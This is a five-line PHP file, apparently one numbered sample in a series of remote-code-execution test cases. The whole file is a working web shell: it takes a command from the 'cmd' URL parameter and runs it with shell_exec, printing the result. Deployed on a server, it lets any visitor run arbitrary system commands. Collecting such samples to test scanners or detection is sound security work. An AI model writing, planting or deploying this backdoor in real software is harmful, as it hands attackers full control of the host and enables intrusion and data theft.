<?php
// RCE test variation #806
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>